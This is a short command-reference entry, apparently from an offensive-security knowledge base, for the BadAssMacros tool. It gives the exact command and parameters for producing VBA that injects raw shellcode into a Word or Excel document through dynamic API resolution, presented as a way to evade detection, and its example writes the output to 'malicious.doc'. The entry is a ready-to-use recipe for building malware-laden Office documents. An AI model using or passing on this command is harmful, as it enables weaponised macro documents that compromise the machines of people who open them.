---
type: command
executor: bash
data: >-
  BadAssMacros.exe -i <path_to_raw_shellcode_file> -w <doc_or_excel> -p no -s
  indirect -o <path_to_output_file>
output: null
platforms:
  - Windows
tags:
  - office
  - macro
  - shellcode
  - injection
verified: true
validated: true
---

# create-vba-indirect-shellcode-injection

## Command

```bash
BadAssMacros.exe -i $_PATH_TO_SHELLCODE -w $_DOC_OR_EXCEL -p no -s indirect -o $_OUTPUT_FILE
```

## Description

Creates VBA for indirect shellcode injection, using dynamic API resolution to avoid direct imports and improve evasion.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$_PATH_TO_SHELLCODE` | Path to raw shellcode file | Yes |
| `$_DOC_OR_EXCEL` | 'doc' or 'excel' for output type | Yes |
| `-p no` | Do not preserve input file | Built-in |
| `-s indirect` | Indirect injection method | Built-in |
| `$_OUTPUT_FILE` | Output path for VBA or document | Yes |

## Examples

### Basic Usage

```bash
BadAssMacros.exe -i payload.bin -w doc -p no -s indirect -o malicious.doc
```

## Expected Output

VBA code with indirect calls, e.g.,:
Dim hKernel As LongPtr
' Load kernel32.dll dynamically and resolve APIs
' Execute shellcode via indirect invocation

## Related

- [[procedures/Create-Office-Macro-Malware-with-BadAssMacros]]
- [[tools/BadAssMacros]]
